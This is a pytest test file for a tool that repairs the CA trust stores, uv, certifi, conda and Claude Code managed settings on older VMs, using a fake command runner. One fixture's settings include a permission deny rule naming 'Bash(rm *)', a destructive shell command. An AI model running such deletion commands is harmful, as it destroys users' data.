"""The kept VMs' trust stores (#816): `workshop/admin/trust_fix.py` and its remote half, offline.

The remote half's commands go through a fake `run` that answers as a VM of an older image would
and records each argument list; its files go to a temporary home. The driver's SSH goes through
a fake `Runner`."""

from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import pwd
import re
import shlex
import signal
import subprocess
import sys
import tarfile
import time
from pathlib import Path
from subprocess import CompletedProcess
from types import SimpleNamespace

import certifi
import pytest
import trust_fix
import trust_fix_remote
from admin_common import IDLE_HOLD_OFF_CMD, RunResult

from .test_trust_stores import EMSIGN_ECC_G3, locked

ROOT = Path(__file__).resolve().parents[2]
PROBE = trust_fix.PROBE_CMD
CLEAN = Path(certifi.where()).read_text()
#: The uv tools of the fixture's VM: the image's two, and one an agent installed without certifi.
TOOLS = ("lean-lsp-mcp", "ruff", "zulip-agent-bridge")
#: Claude Code's managed settings as an image before #882 wrote them, and as one since does.
MANAGED_OLD = {"env": {"DISABLE_AUTOUPDATER": "1"}, "disableClaudeAiConnectors": True}
MANAGED_NEW = {
    "env": {"DISABLE_AUTOUPDATER": "1", "CLAUDE_CODE_CERT_STORE": "system"},
    "disableClaudeAiConnectors": True,
}
CLAUDE_OK = "claude: CLAUDE_CODE_CERT_STORE=system, and agent reads {}"


def certifi_pem(prefix: Path) -> Path:
    """Where an environment's certifi keeps its bundle: the store step 3 fixes."""
    return prefix / "lib" / "python3.12" / "site-packages" / "certifi" / "cacert.pem"


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


@pytest.fixture
def remote(tmp_path, monkeypatch):
    """The remote half, its home and /opt/certbot under tmp_path, trust_stores.py loaded as
    `main` loads it; each environment with a clean bundle, three uv tools among them; Claude
    Code's managed settings as an image since #882 writes them."""
    mod, home = trust_fix_remote, tmp_path / "home"
    tools = home / ".local" / "share" / "uv" / "tools"
    envs = {"venv": (home / "venv", "agent"), "certbot": (tmp_path / "certbot", "root")}
    for name, value in {
        "HOME": home, "BIN": home / ".local" / "bin", "TOOLS": tools, "ENVS": envs,
        "PYTHONS": home / ".local" / "share" / "uv" / "python", "CONDA": home / "miniforge",
        "CONDA_ENVS": {"base": home / "miniforge"}, "SYSTEM_CERTS": tmp_path / "certs",
        "LOCK": str(tmp_path / "trust-fix.lock"), "HOLD": str(tmp_path / "zab-idle-stop.hold"),
        "MANAGED": tmp_path / "claude-code" / "managed-settings.json",
    }.items():  # fmt: skip
        monkeypatch.setattr(mod, name, value)
    me = SimpleNamespace(pw_uid=os.getuid(), pw_gid=os.getgid())
    monkeypatch.setattr(mod, "pwd", SimpleNamespace(getpwnam=lambda name: me))
    monkeypatch.setattr(mod.platform, "machine", lambda: "x86_64")
    mod.BIN.mkdir(parents=True)
    for prefix in [p for p, _ in envs.values()] + [tools / t for t in TOOLS] + [home / "miniforge"]:
        (prefix / "bin").mkdir(parents=True)
        (prefix / "bin" / "python").touch()
        certifi_pem(prefix).parent.mkdir(parents=True)
        certifi_pem(prefix).write_text(CLEAN)
    (home / "miniforge" / "bin" / "conda").touch()
    (home / "miniforge" / "ssl").mkdir()
    (home / "miniforge" / "ssl" / "cacert.pem").write_text(CLEAN)
    mod.SYSTEM_CERTS.mkdir()
    (mod.SYSTEM_CERTS / "ca-certificates.crt").write_text(CLEAN)
    mod.MANAGED.parent.mkdir()
    mod.MANAGED.write_text(json.dumps(MANAGED_NEW))
    ts = {"__name__": "trust_stores"}
    exec(trust_fix.TRUST_STORES.read_text(), ts)  # noqa: S102 - the repository's own file
    # apt_repair.py as the driver sends it (#947)
    monkeypatch.setattr(mod, "APT_REPAIR", b64(trust_fix.APT_REPAIR.read_bytes()))
    return SimpleNamespace(mod=mod, ts=ts)


class FakeVM:
    """Answers as a VM of the Oct 19 image: ca-certificates, uv and certifi older than their
    floors, and conda's bundle with the root. Records each argument list, its user, its env."""

    def __init__(self, mod, tmp_path):
        self.mod, self.calls, self.uv, self.uvx, self.certifi = mod, [], "0.13.2", "", "2026.7.22"
        self.tarball, self.curl, self.conda = b"", (0, ""), (0, "")  # (exit, stderr)
        self.apt = {"update": (0, ""), "ca-certificates": (0, "")}  # by apt-get's last word
        self.repair = (0, "apt: nothing to repair\n")  # apt_repair.py's (exit, stdout), #947
        self.repairs = []  # (the script's bytes, its directory's mode) of each run
        self.timeouts = []  # (program, timeout) of each call
        self.store = 0  # `AGENT_READS_STORE`'s exit status: agent reads the system store
        self.bundle = mod.CONDA / "vendored.pem"  # what conda's certifi and pip return
        self.bundle.write_text(CLEAN + EMSIGN_ECC_G3)
        #: certifi's version by an environment's Python, where not `certifi`'s
        self.versions = {str(mod.TOOLS / "ruff" / "bin" / "python"): ""}

    def __call__(self, argv, *, user="root", env=None, timeout=300):
        self.calls.append((list(argv), user, dict(env or {})))
        self.timeouts.append((Path(argv[0]).name, timeout))
        out, (code, err) = "", (0, "")
        if argv[0] == "dpkg-query":
            out = "20260601~24.04.1"
        elif argv[0] == "dpkg":
            code = 1  # older than CA_FLOOR
        elif argv[0] == "apt-get":
            code, err = self.apt[argv[-1]]
        elif argv[-1].endswith("/apt_repair.py"):
            script = Path(argv[-1])
            self.repairs.append((script.read_bytes(), script.parent.stat().st_mode & 0o777))
            code, out = self.repair
        elif argv[0].endswith("/conda"):
            code, err = self.conda
        elif argv[-1] == "--version":
            version = self.uvx if argv[0].endswith("/uvx") and self.uvx else self.uv
            out = f"uv {version} (x86_64-unknown-linux-gnu)"
        elif argv[-1] == self.mod.VERSION_PY:
            out = self.versions.get(argv[-4], self.certifi)
        elif argv[-1] == self.mod.WHERE_PY:
            out = f"{self.bundle}\n{self.bundle}\n"
        elif argv[-1] == self.mod.AGENT_READS_STORE:
            code = self.store
        elif argv[0] == "curl":
            Path(argv[argv.index("-o") + 1]).write_bytes(self.tarball)
            code, err = self.curl
        elif argv[1:3] == ["pip", "install"] and "-r" in argv:  # certifi, and its bundle, new
            self.req = Path(argv[argv.index("-r") + 1]).read_text()
            python = Path(argv[argv.index("--python") + 1])
            self.versions[str(python)] = self.mod.CERTIFI
            certifi_pem(python.parent.parent).write_text(CLEAN)
        return CompletedProcess(argv, code, out, err)

    def run(self, program: str) -> list[tuple[list[str], str, dict]]:
        return [c for c in self.calls if c[0][0].endswith(program)]


def uv_tarball() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name in ("uv", "uvx"):
            data = f"#!/bin/sh\necho {name}\n".encode()
            info = tarfile.TarInfo(f"uv-x86_64-unknown-linux-gnu/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def test_the_remote_pins_are_the_repositorys():
    """deploy.sh's uv and SHA-256s, uv.lock's certifi and hashes, and build.sh's conda floors,
    `WHERE_PY` and ca-certificates floor: a pin that moves there must move here."""
    mod = trust_fix_remote
    deploy = (ROOT / "workshop" / "adminserver" / "deploy.sh").read_text()
    assert re.search(rf"^UV_VERSION={re.escape(mod.UV_VERSION)}$", deploy, re.M)
    for arch, digest in mod.UV_SHA256.items():
        assert f"\nUV_SHA256_{arch}={digest}\n" in deploy
    lock = locked()
    assert mod.CERTIFI == lock["version"] and set(mod.CERTIFI_HASHES) == lock["hashes"]
    build = (ROOT / "workshop" / "ami" / "build.sh").read_text()
    assert " ".join(f"'{s}'" for s in mod.CONDA_SPECS) in build
    assert f"WHERE_PY='{mod.WHERE_PY}'" in build
    assert mod.CA_FLOOR in build
    # #882: the managed settings' file and key, and the smoke test's read of the system store
    assert f"sudo python3 - {mod.MANAGED} <<" in build
    assert f'data["env"]["{mod.CERT_STORE}"] = "system"' in build
    assert f"SYSTEM_STORE='{mod.AGENT_READS_STORE}'" in build
    smoke = (ROOT / "workshop" / "ami" / "build_ami.py").read_text()
    grep, ls = mod.AGENT_READS_STORE.split(" && ")
    assert f"store='{grep}'\nstore=\"$store\"' && {ls}'\n" in smoke


def test_a_dry_run_changes_nothing_and_says_what_it_would(remote, tmp_path, monkeypatch):
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    mod.MANAGED.write_text(json.dumps(MANAGED_OLD))
    before = mod.MANAGED.read_bytes()
    assert mod.step_claude(False) == "unset: would set system"
    assert mod.MANAGED.read_bytes() == before
    assert mod.step_system(False) == "20260601~24.04.1: would upgrade"
    assert mod.step_uv(False, system_ok=False) == "0.13.2: would install 0.13.7"
    assert (
        mod.step_certifi(*mod.ENVS["venv"], False, uv_ok=False)
        == "2026.7.22: would install 2026.10.23"
    )
    conda = "base would update ca-certificates, certifi, pip and openssl"  # openssl: conda's own
    assert mod.step_conda(remote.ts, False, system_ok=False) == conda
    assert not [c for c in vm.calls if c[0][0] in ("apt-get", "curl") or "install" in c[0]]
    assert not list(mod.BIN.iterdir())
    lines, ok, left = mod.check(remote.ts)
    assert not ok and not left and lines[-2] == "uv 0.13.2, uvx 0.13.2"
    assert lines[-1] == f"FAILED: claude: CLAUDE_CODE_CERT_STORE is unset in {mod.MANAGED}"
    assert f"  DISTRUSTED emSign ECC Root CA - G3: {vm.bundle}" in lines


def test_the_cert_store_is_merged_keeping_every_other_key(remote, tmp_path, monkeypatch):
    """#882, criterion 2: CLAUDE_CODE_CERT_STORE=system merged into the managed settings' `env`,
    every other key kept, the file replaced whole with the image's mode; a rerun changes
    nothing; another value is replaced; the check passes only once it is there."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    other = {**MANAGED_OLD, "permissions": {"deny": ["Bash(rm *)"]}}
    mod.MANAGED.write_text(json.dumps(other))
    mod.MANAGED.chmod(0o600)
    assert not mod.check_claude()[1]
    assert mod.step_claude(True) == "unset -> system"
    merged = json.loads(mod.MANAGED.read_text())
    assert merged == {**other, "env": {**other["env"], "CLAUDE_CODE_CERT_STORE": "system"}}
    assert mod.MANAGED.stat().st_mode & 0o777 == 0o644
    assert sorted(p.name for p in mod.MANAGED.parent.iterdir()) == ["managed-settings.json"]
    assert mod.check_claude() == (CLAUDE_OK.format(mod.SYSTEM_CERTS), True)
    before = mod.MANAGED.stat()
    assert mod.step_claude(True) == "system, current"  # a rerun leaves the file alone
    after = mod.MANAGED.stat()
    assert (after.st_ino, after.st_mtime_ns) == (before.st_ino, before.st_mtime_ns)
    mod.MANAGED.write_text(json.dumps({"env": {"CLAUDE_CODE_CERT_STORE": "bundled,system"}}))
    assert mod.step_claude(False) == "bundled,system: would set system"
    assert mod.step_claude(True) == "bundled,system -> system"
    assert [c for c in vm.calls if c[0][0] != "bash"] == []  # nothing run but the check's read


def test_an_absent_managed_settings_file_is_created_and_shown_absent(remote, tmp_path, monkeypatch):
    """Review round 1 on #885, N5: no file reads `absent`, not `unset`, since the file step 5
    creates holds its key alone, without the image's other two; the check fails on no file."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    mod.MANAGED.unlink()
    mod.MANAGED.parent.rmdir()
    assert mod.check_claude() == (f"FAILED: claude: no {mod.MANAGED}", False)
    assert mod.step_claude(False) == "absent: would set system"
    assert not mod.MANAGED.parent.exists()
    assert mod.step_claude(True) == "absent -> system"
    assert json.loads(mod.MANAGED.read_text()) == {"env": {"CLAUDE_CODE_CERT_STORE": "system"}}
    assert mod.MANAGED.stat().st_mode & 0o777 == 0o644
    assert mod.step_claude(True) == "system, current"


@pytest.mark.parametrize("leftover", ["link", "dangling link", "file"])
def test_a_leftover_new_file_is_never_written_through(remote, tmp_path, monkeypatch, leftover):
    """Review round 1 on #885, N2: a path left at `managed-settings.json.new`, a link above all,
    is removed and the new file created afresh beside the managed one: the link's target is
    untouched, and the managed path ends up a regular file."""
    mod = remote.mod
    mod.MANAGED.write_text(json.dumps(MANAGED_OLD))
    new = mod.MANAGED.with_name("managed-settings.json.new")
    target = tmp_path / "elsewhere.json"
    if leftover == "link":
        target.write_text("theirs")
        target.chmod(0o600)
        new.symlink_to(target)
    elif leftover == "dangling link":
        new.symlink_to(target)
    else:
        new.write_text("half a run's")
    assert mod.step_claude(True) == "unset -> system"
    assert not mod.MANAGED.is_symlink() and mod.MANAGED.is_file()
    assert json.loads(mod.MANAGED.read_text())["env"]["CLAUDE_CODE_CERT_STORE"] == "system"
    assert mod.MANAGED.stat().st_mode & 0o777 == 0o644
    assert not os.path.lexists(new)
    if leftover == "link":
        assert target.read_text() == "theirs" and target.stat().st_mode & 0o777 == 0o600
    else:
        assert not target.exists()


@pytest.mark.parametrize(
    "text",
    ['{"env": {"DISABLE_AUTOUPDATER": "1"}', "[]", '{"env": ["x"]}', '{"env": null}', "\xff"],
)
def test_managed_settings_that_arent_a_json_object_are_left_alone(
    remote, tmp_path, monkeypatch, text
):
    """#882, criterion 4: a file that isn't valid JSON, or isn't an object with an object `env`,
    is refused, not overwritten, and fails the check."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    mod.MANAGED.write_bytes(text.encode("latin-1"))
    before = mod.MANAGED.read_bytes()
    for apply in (False, True):
        out = mod.step_claude(apply)
        assert out.startswith(f"FAILED: {mod.MANAGED} left as it is: "), out
    assert mod.MANAGED.read_bytes() == before
    assert sorted(p.name for p in mod.MANAGED.parent.iterdir()) == ["managed-settings.json"]
    line, ok = mod.check_claude()
    assert not ok and line.startswith(f"FAILED: claude: {mod.MANAGED}: ")
    steps = mod.run_steps(remote.ts, True)
    assert steps["claude store"].startswith("FAILED: ")  # the driver's rerun list takes it


def test_the_check_needs_agent_to_read_the_system_store(remote, tmp_path, monkeypatch):
    """#882: an empty or unreadable system store makes Claude Code fall back to its bundled
    roots, so the check reads it as agent, by the image's smoke test's own command."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    vm.store = 1
    line, ok = mod.check_claude()
    assert not ok and line == f"FAILED: claude: agent reads no certificate from {mod.SYSTEM_CERTS}"
    ((argv, user, _),) = [c for c in vm.calls if c[0][0] == "bash"]
    assert argv == ["bash", "-c", mod.AGENT_READS_STORE] and user == "agent"


def test_uv_is_replaced_only_by_the_pinned_tarball(remote, tmp_path, monkeypatch):
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.tarball = uv_tarball()
    monkeypatch.setattr(mod, "run", vm)
    monkeypatch.setitem(mod.UV_SHA256, "x86_64", "0" * 64)
    assert (
        mod.step_uv(True, system_ok=True) == "FAILED: uv 0.13.7: wrong SHA-256, nothing installed"
    )
    assert not list(mod.BIN.iterdir())
    ((curl, user, _),) = vm.run("curl")
    assert user == "root" and curl[1:4] == ["-fsSL", "--proto", "=https"]
    assert curl[-1] == mod.UV_URL.format("0.13.7", "x86_64")
    assert curl[-1].startswith("https://github.com/astral-sh/uv/releases/download/0.13.7/")
    monkeypatch.setitem(mod.UV_SHA256, "x86_64", hashlib.sha256(vm.tarball).hexdigest())
    assert mod.step_uv(True, system_ok=True) == "0.13.2 -> 0.13.2"  # the fake still answers 0.13.2
    for name in ("uv", "uvx"):
        assert (mod.BIN / name).read_text() == f"#!/bin/sh\necho {name}\n"
        assert (mod.BIN / name).stat().st_mode & 0o777 == 0o755
    vm.uv = "0.13.7"
    assert mod.step_uv(True, system_ok=True) == "0.13.7, current"
    vm.uvx = "0.13.2"  # an old uvx beside a new uv is no current uv (review round 1, N8)
    assert mod.step_uv(False, system_ok=True) == "0.13.7 (uvx 0.13.2): would install 0.13.7"


def test_certifi_goes_in_by_its_hashes_as_the_environments_owner(remote, tmp_path, monkeypatch):
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    prefix, owner = mod.ENVS["certbot"]
    assert mod.step_certifi(prefix, owner, True, uv_ok=True) == "2026.7.22 -> 2026.10.23"
    ((argv, user, env),) = [c for c in vm.calls if c[0][1:3] == ["pip", "install"]]
    assert argv[0] == str(mod.BIN / "uv") and user == "root" and env == {"UV_NO_CONFIG": "1"}
    assert argv[4:6] == ["--python", str(prefix / "bin" / "python")]
    assert "--require-hashes" in argv and "--no-deps" in argv
    # no timeout: it would kill sudo and leave uv installing past the run's lock (round 4)
    assert [t for p, t in vm.timeouts if p == "uv" and t is None] == [None]
    words = vm.req.split()
    assert words[0] == "certifi==2026.10.23"
    assert {w.removeprefix("--hash=") for w in words[1:]} == locked()["hashes"]
    assert mod.step_certifi(prefix, owner, True, uv_ok=True) == "2026.10.23, current"
    assert mod.step_certifi(tmp_path / "none", owner, True, uv_ok=True) == "absent"


def test_apt_and_conda_go_through_the_system_store(remote, tmp_path, monkeypatch):
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    mod.step_system(True)
    update, install = (c[0] for c in vm.run("apt-get"))
    assert update[-1] == "update" and install[-2:] == ["--only-upgrade", "ca-certificates"]
    assert f"DPkg::Lock::Timeout={mod.APT_LOCK_WAIT_S}" in install and mod.APT_LOCK_WAIT_S == 300
    # review round 1, B1: apt is killed only well after its lock's wait, not by a lock freed late
    assert [t for p, t in vm.timeouts if p == "apt-get"] == [mod.APT_TIMEOUT_S] * 2
    assert mod.APT_TIMEOUT_S >= mod.APT_LOCK_WAIT_S + 600
    assert mod.step_conda(remote.ts, True, system_ok=True) == "base updated"
    ((argv, user, env),) = vm.run("/conda")
    assert user == "agent" and env == {"CONDA_SSL_VERIFY": "/etc/ssl/certs/ca-certificates.crt"}
    assert argv[1:6] == ["install", "-y", "-q", "-p", str(mod.CONDA)]  # the prefix the check reads
    assert argv[-3:] == list(mod.CONDA_SPECS)
    # no timeout of its own: one would kill sudo and leave conda running (review round 2, B3)
    assert [t for p, t in vm.timeouts if p == "conda"] == [None]
    vm.bundle.write_text(CLEAN)  # the bundles conda's Python returns now lack the root
    assert mod.step_conda(remote.ts, True, system_ok=True) == "base current"


def test_apts_lock_its_kill_and_condas_failure_are_named(remote, tmp_path, monkeypatch):
    """Review round 1 on #856: a held lock shows apt's `Could not get lock` line, under the right
    label; an apt killed in its install says `dpkg --configure -a`; a conda that failed gives
    its own error."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    held = (
        "E: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 812"
        " (unattended-upgr)\nN: Be aware that removing the lock file is not a solution\n"
        "E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another"
        " process using it?"
    )
    vm.apt["ca-certificates"] = (100, held)
    assert mod.step_system(True) == (
        "FAILED: apt-get install: E: Could not get lock /var/lib/dpkg/lock-frontend. It is held"
        " by process 812 (unattended-upgr)"
    )
    vm.apt["ca-certificates"] = (124, "TimeoutExpired: Command '…' timed out after 900 seconds")
    assert mod.step_system(True) == (
        "FAILED: apt-get install killed after 900 s, maybe mid-install: run "
        "`sudo dpkg --configure -a` on the VM, then rerun"
    )
    vm.conda = (
        1,
        "CondaHTTPError: HTTP 000 CONNECTION FAILED for url <https://conda.anaconda.org>",
    )
    assert mod.step_conda(remote.ts, True, system_ok=True) == (
        "FAILED: base: CondaHTTPError: HTTP 000 CONNECTION FAILED for url"
        " <https://conda.anaconda.org>"
    )


def test_an_exception_in_a_step_is_that_steps_failure(remote, tmp_path, monkeypatch):
    """Review round 1 on #856, N4: the other steps go on, and the report comes back."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.uv = "0.13.7"
    monkeypatch.setattr(mod, "run", vm)

    def broken(*args, **kwargs):
        raise PermissionError(13, "Permission denied", str(mod.BIN))

    monkeypatch.setattr(mod, "step_uv", broken)
    steps = mod.run_steps(remote.ts, True)
    assert steps["uv"] == f"FAILED: PermissionError: [Errno 13] Permission denied: '{mod.BIN}'"
    assert steps["venv"] == "2026.7.22 -> 2026.10.23"  # the others went on


def test_a_failed_apt_blocks_every_download_through_the_old_stores(remote, tmp_path, monkeypatch):
    """Codex round 1 on #856: apt fails on its lock, and /etc/ssl/certs still holds the root.
    uv's download (curl) and conda's install go through that store, and certifi's through the
    old uv's roots: all three are blocked, and nothing is downloaded or installed."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.apt["update"] = (
        100,
        "E: Could not get lock /var/lib/apt/lists/lock. It is held by process 812",
    )
    (mod.SYSTEM_CERTS / "ca-certificates.crt").write_text(CLEAN + EMSIGN_ECC_G3)
    monkeypatch.setattr(mod, "run", vm)
    steps = mod.run_steps(remote.ts, True)
    system = f"blocked, nothing installed: {mod.SYSTEM_CERTS} still holds a distrusted root"
    old_uv = "blocked, nothing installed: uv 0.13.2 still holds a distrusted root"
    assert steps == {
        "apt source": "apt: nothing to repair",  # before the update (#947)
        "ca-certificates": "FAILED: apt-get update: E: Could not get lock /var/lib/apt/lists/"
        "lock. It is held by process 812",
        "uv": system,
        **dict.fromkeys(("venv", "certbot"), old_uv),
        "uv tools": f"lean-lsp-mcp {old_uv}; ruff no certifi; zulip-agent-bridge {old_uv}",
        "conda": f"base {system}",
        "claude store": "system, current",  # downloads nothing: never blocked
    }
    assert not vm.run("curl") and not vm.run("/conda")
    assert not [c for c in vm.calls if c[0][1:3] == ["pip", "install"]]
    assert not list(mod.BIN.iterdir())


#: What apt says on the Oct 19 image while its Macaulay2 source is Launchpad's expired snapshot.
EXPIRED = (
    "E: The repository 'https://snapshot.ppa.launchpadcontent.net/macaulay2/macaulay2/ubuntu/"
    "20261018T000000Z noble Release' no longer has a Release file."
)
REMOVED = (
    "apt: removed /etc/apt/sources.list.d/macaulay2.sources, an expired"
    " snapshot.ppa.launchpadcontent.net source; held macaulay2, macaulay2-common, gfan, msolve,"
    " libmsolve3"
)


def test_the_apt_source_is_repaired_before_the_update(remote, tmp_path, monkeypatch):
    """#865's Codex 6715149461: an Oct 19 VM whose ca-certificates is old fails step 1's
    `apt-get update` on its expired Macaulay2 source, which the rollout removes only after the
    trust fix. So step 1 first runs the release's apt_repair.py as a rollout does: the driver's
    copy, as root, with the system Python in isolated mode, from a directory of root's own, and
    the update then works."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.repair = (0, REMOVED + "\n")
    monkeypatch.setattr(mod, "run", vm)
    steps = mod.run_steps(remote.ts, True)
    assert list(steps)[:2] == ["apt source", "ca-certificates"]
    assert steps["apt source"] == REMOVED
    assert steps["ca-certificates"] == "20260601~24.04.1 -> 20260601~24.04.1"  # the fake's
    programs = [Path(c[0][-1]).name if c[0][0] == sys.executable else c[0][0] for c in vm.calls]
    assert programs.index("apt_repair.py") < programs.index("apt-get")  # before the update
    ((argv, user, env),) = [c for c in vm.calls if c[0][-1].endswith("/apt_repair.py")]
    assert argv[:2] == [sys.executable, "-I"] and user == "root" and env == {}
    assert vm.repairs == [(trust_fix.APT_REPAIR.read_bytes(), 0o700)]
    assert (Path(sys.executable).name, mod.APT_TIMEOUT_S) in vm.timeouts  # apt's own bound
    assert not Path(argv[-1]).exists()  # its directory is gone with the run


def test_no_repair_on_a_dry_run_or_where_apt_doesnt_run(remote, tmp_path, monkeypatch):
    """Only where step 1 runs apt: never on a dry run, never where ca-certificates is current;
    the report then has no `apt source`."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    monkeypatch.setattr(mod, "run", vm)
    assert "apt source" not in mod.run_steps(remote.ts, False) and vm.repairs == []
    monkeypatch.setattr(mod, "ca_current", lambda have: True)
    assert "apt source" not in mod.run_steps(remote.ts, True) and vm.repairs == []


@pytest.mark.parametrize(
    ("repair", "said"),
    [
        ((1, "apt: hold failed, so /etc/apt/sources.list.d/macaulay2.sources is kept for the next"
          " rollout: E: Could not get lock /var/lib/dpkg/lock-frontend\n"),
         "FAILED: apt: hold failed, so /etc/apt/sources.list.d/macaulay2.sources is kept for the"
         " next rollout: E: Could not get lock /var/lib/dpkg/lock-frontend"),
        ((0, "apt: kept /etc/apt/sources.list.d/macaulay2.sources: it names other sources beside"
          " the expired snapshot.ppa.launchpadcontent.net one, so apt still fails there; fix it"
          " by hand\n"),
         "apt: kept /etc/apt/sources.list.d/macaulay2.sources: it names other sources beside the"
         " expired snapshot.ppa.launchpadcontent.net one, so apt still fails there; fix it by"
         " hand"),
    ],
)  # fmt: skip
def test_a_repair_that_failed_or_kept_the_source_is_said_and_the_update_still_decides(
    remote, tmp_path, monkeypatch, repair, said
):
    """Fail closed: whatever the repair says, the update runs, and an update that still fails
    on the source stops step 1 as before, which blocks the downloads through the old store."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.repair, vm.apt["update"] = repair, (100, EXPIRED)
    (mod.SYSTEM_CERTS / "ca-certificates.crt").write_text(CLEAN + EMSIGN_ECC_G3)
    monkeypatch.setattr(mod, "run", vm)
    steps = mod.run_steps(remote.ts, True)
    assert steps["apt source"] == said
    assert steps["ca-certificates"] == f"FAILED: apt-get update: {EXPIRED}"
    assert steps["uv"].startswith("blocked") and not vm.run("curl")


def test_a_repair_that_cant_run_is_a_failure_and_the_update_still_runs(
    remote, tmp_path, monkeypatch
):
    """A repair cut off, or one that raised before its line, is `FAILED` with what it said."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.repair = (124, "")
    monkeypatch.setattr(mod, "run", vm)
    assert mod.step_apt(True) == "FAILED: exit 124"
    vm.repair = (0, "")  # #957's review, N6: a script that said nothing, run without the driver
    assert mod.step_apt(True) == "apt: no line"
    assert len(vm.run("apt-get")) == 0  # step_apt alone: the update is step_system's
    assert mod.step_system(True).endswith("-> 20260601~24.04.1") and len(vm.run("apt-get")) == 2


def test_the_repair_runs_for_real_and_a_second_run_finds_nothing(remote, tmp_path, monkeypatch):
    """The driver's apt_repair.py, decoded, written and run as step 1 runs it, with the real
    `run` and interpreter: its sources file and its two programs moved under tmp_path. It
    removes the Oct 19 file and holds the packages; a second run, a rollout's say, finds nothing
    to repair (#947: idempotent with the rollout's repair)."""
    mod = remote.mod
    sources = tmp_path / "macaulay2.sources"
    sources.write_text(
        "Types: deb\nURIs: https://snapshot.ppa.launchpadcontent.net/macaulay2/macaulay2/ubuntu/"
        "20261018T000000Z\nSuites: noble\nComponents: main\n"
    )
    log = tmp_path / "calls.log"
    tools = {}
    for name, body in (("apt-mark", "exit 0"), ("dpkg-query", 'printf "ii "')):
        tool = tmp_path / name
        tool.write_text(f'#!/bin/sh\necho "$0 $*" >> {log}\n{body}\n')
        tool.chmod(0o755)
        tools[name] = str(tool)
    source = trust_fix.APT_REPAIR.read_text()
    for old, new in (
        ('"/etc/apt/sources.list.d/macaulay2.sources"', f'"{sources}"'),
        ('"/usr/bin/apt-mark"', f'"{tools["apt-mark"]}"'),
        ('"/usr/bin/dpkg-query"', f'"{tools["dpkg-query"]}"'),
    ):
        assert source.count(old) == 1, old
        source = source.replace(old, new)
    monkeypatch.setattr(mod, "APT_REPAIR", b64(source.encode()))
    monkeypatch.setattr(mod, "ca_version", lambda: "20240203")
    monkeypatch.setattr(mod, "ca_current", lambda have: False)
    assert mod.step_apt(True) == (
        f"apt: removed {sources}, an expired snapshot.ppa.launchpadcontent.net source; held"
        " macaulay2, macaulay2-common, gfan, msolve, libmsolve3"
    )
    assert not sources.exists()
    assert f"{tools['apt-mark']} hold macaulay2 macaulay2-common gfan msolve libmsolve3" in (
        log.read_text().splitlines()
    )
    assert mod.step_apt(True) == "apt: nothing to repair"


def test_certifi_waits_for_uv_and_a_clean_store_lets_everything_through(
    remote, tmp_path, monkeypatch
):
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.curl = (22, "curl: (22) The requested URL returned error: 503")
    monkeypatch.setattr(mod, "run", vm)
    steps = mod.run_steps(remote.ts, True)  # apt works; the system store is clean
    assert steps["uv"].startswith("FAILED: uv 0.13.7's download: curl: (22)")
    assert steps["venv"] == "blocked, nothing installed: uv 0.13.2 still holds a distrusted root"
    assert steps["conda"] == "base updated"  # conda trusts the system store, which is clean
    vm.curl, vm.tarball = (0, ""), uv_tarball()
    monkeypatch.setitem(mod.UV_SHA256, "x86_64", hashlib.sha256(vm.tarball).hexdigest())
    real = vm.__call__

    def upgraded(argv, **kw):  # uv answers 0.13.7 once its tarball is in place
        if argv[-1] == "--version" and (mod.BIN / "uvx").exists():
            vm.uv = "0.13.7"
        return real(argv, **kw)

    monkeypatch.setattr(mod, "run", upgraded)
    steps = mod.run_steps(remote.ts, True)
    assert steps["uv"] == "0.13.2 -> 0.13.7" and steps["venv"] == "2026.7.22 -> 2026.10.23"


def test_every_uv_tool_gets_certifi_the_bridges_included(remote, tmp_path, monkeypatch):
    """Codex round 2 on #856: an older image's VM with no rollout since has certifi 2026.7.22 in
    the bridge's tool environment too, which the check reads with the rest of the uv tools. Each
    tool environment with certifi gets it, as agent; one without certifi gets none."""
    mod, vm = remote.mod, FakeVM(remote.mod, tmp_path)
    vm.uv = "0.13.7"
    vm.bundle.write_text(CLEAN)  # conda's are clean: only the tools are to do
    bridge = mod.TOOLS / "zulip-agent-bridge"
    certifi_pem(bridge).write_text(CLEAN + EMSIGN_ECC_G3)
    monkeypatch.setattr(mod, "run", vm)
    lines, ok, _ = mod.check(remote.ts)
    assert not ok and f"  DISTRUSTED emSign ECC Root CA - G3: {certifi_pem(bridge)}" in lines
    assert mod.run_steps(remote.ts, False)["uv tools"] == (
        "lean-lsp-mcp 2026.7.22: would install 2026.10.23; ruff no certifi; "
        "zulip-agent-bridge 2026.7.22: would install 2026.10.23"
    )
    steps = mod.run_steps(remote.ts, True)
    assert steps["uv tools"] == (
        "lean-lsp-mcp 2026.7.22 -> 2026.10.23; ruff no certifi; "
        "zulip-agent-bridge 2026.7.22 -> 2026.10.23"
    )
    pythons = [(c[0][5], c[1]) for c in vm.calls if c[0][1:3] == ["pip", "install"]]
